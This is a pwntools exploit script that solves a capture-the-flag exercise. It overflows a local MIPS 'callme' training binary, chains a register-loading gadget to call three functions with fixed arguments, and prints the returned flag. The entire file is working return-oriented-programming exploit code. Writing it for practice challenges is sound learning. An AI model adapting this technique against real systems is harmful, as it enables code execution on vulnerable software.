from pwn import *

BINARY = "./callme_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY

p = process(BINARY)

"""
useful_gadget :
.text:00400BB0                      usefulGadgets:
.text:00400BB0 10 00 A4 8F                  lw      $a0, 0x20+var_10($sp)
.text:00400BB4 0C 00 A5 8F                  lw      $a1, 0x20+var_14($sp)
.text:00400BB8 08 00 A6 8F                  lw      $a2, 0x20+var_18($sp)
.text:00400BBC 04 00 B9 8F                  lw      $t9, 0x20+var_1C($sp)
.text:00400BC0 09 F8 20 03                  jalr    $t9

.text:00400BC8 14 00 BF 8F                  lw      $ra, 0x20+var_C($sp)
.text:00400BCC 08 00 E0 03                  jr      $ra
.text:00400BD0 18 00 BD 23                  addi    $sp, 0x18
"""

rop = b"A" * 36

for func in ['callme_one', 'callme_two', 'callme_three']:
    # useful_gadget
    rop += p32(0x400BB0)
    rop += b"BBBB"
    # t9 --> function called by "jalr $t9"
    rop += p32(ELF.symbols[func])
    # a2 --> 3rd parameter
    rop += p32(0xd00df00d)
    # a1 --> 2nd parameter
    rop += p32(0xcafebabe)
    # a0 --> 1st parameter
    rop += p32(0xdeadbeef)

log.success(f"ROP chain : {rop}")
p.sendline(rop)

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
